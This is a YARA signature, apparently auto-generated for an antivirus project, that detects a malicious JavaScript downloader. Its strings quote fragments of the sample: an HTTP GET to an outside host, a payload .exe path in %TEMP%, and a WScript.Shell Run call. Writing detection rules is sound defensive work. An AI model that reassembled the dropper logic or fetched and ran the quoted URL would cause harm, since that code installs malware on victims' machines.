rule sig_20160329_970b3ef0151d1ab64cfbedb81eb2cac3 {
  meta:
    description = "datamaliciousorder - file 20160329_970b3ef0151d1ab64cfbedb81eb2cac3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4f9850e3f0192b9b9341547d462f9a644f22060f93aacefafca440fbd10551fa"

  strings:
    $s1  = "mx[jV](\"GET\", \"http://energq.com/e3ola\", false);" fullword ascii
    $s2  = "function q() {return ZX[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"3fnKFqGcs.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[JI](a() * 11); if (mx[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var ZX = function L() {return WScript[Wy](\"WScript.Shell\");}(), gz = 11;" fullword ascii
    $s5  = "function aA(La, op){dU = dU * 1; return La - op;};" fullword ascii
    $s6  = "function G(){return \"\" + lt;};" fullword ascii
    $s7  = "function y() {return ((dI == true) && (dI == W0)) ? 1 : dU;};" fullword ascii
    $s8  = "function a0(Vx){ZX[\"Run\"](Vx, dU, dU);};" fullword ascii
    $s9  = "var dx = new this[\"Date\"]();" fullword ascii
    $s10 = "function a(){return 22;};" fullword ascii
    $s11 = "function Gd(){return Wy;};" fullword ascii
    $s12 = "function qj(P) {var U = (1, 2, 3, 4, 5, P); return U;};" fullword ascii
    $s13 = "function rh()" fullword ascii
    $s14 = " while (dw){" fullword ascii
    $s15 = "return aA(A, c);" fullword ascii
    $s16 = "var Kp = false;" fullword ascii
    $s17 = "var W0 = false;" fullword ascii
    $s18 = "W0 = true; " fullword ascii
    $s19 = "var dI = false;" fullword ascii
    $s20 = "dI = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}